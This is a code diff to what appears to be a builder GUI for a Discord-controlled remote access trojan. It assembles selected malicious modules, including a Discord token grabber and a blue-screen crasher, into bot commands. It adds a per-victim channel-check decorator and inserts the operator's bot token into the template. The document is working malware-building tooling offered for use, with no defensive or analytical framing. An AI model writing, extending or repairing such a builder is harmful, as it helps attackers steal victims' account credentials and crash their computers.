@@ -325,10 +325,11 @@ class RatBuilderGUI(QMainWindow):
         self.output_text.append("Generating command implementations...")
         
         # Generate command definitions
+        # Generate command definitions
         command_definitions = []
-        
+
         for command_name in selected_commands:
-            # Map command names to actual filenames (jumpscare removed)
+            # Map command names to actual filenames
             command_file_map = {
                 'tkn_grab': 'discord_token_grabber.py',
                 'bsod': 'bsod.py',
@@ -349,18 +350,18 @@ class RatBuilderGUI(QMainWindow):
                 with open(command_path, 'r', encoding='utf-8') as f:
                     command_code = f.read().strip()
                 
-                # Add command definition
+                # Add command definition WITH the user channel check decorator
                 command_definitions.append(f"""
 
 @bot.command()
+@is_correct_user_channel()
 async def {command_name}(ctx):
 {self.indent_code(command_code)}
-""")
+    """)
                 self.output_text.append(f"Added command: {command_name}")
             else:
                 self.output_text.append(f"Warning: Command file not found: {command_path}")
-        
-        # Replace placeholders in template
+
         # Replace placeholders in template
         template_content = template_content.replace(
             'category_id="replaceme --> in builder category id"',
@@ -371,7 +372,6 @@ async def {command_name}(ctx):
             "bot.run('bot token here-->replace')",
             f"bot.run('{token}')"
         )
-        
         # Remove placeholder command definitions (the ones at the bottom of the file)
         # These are the placeholder commands that need to be removed
         placeholder_commands = [
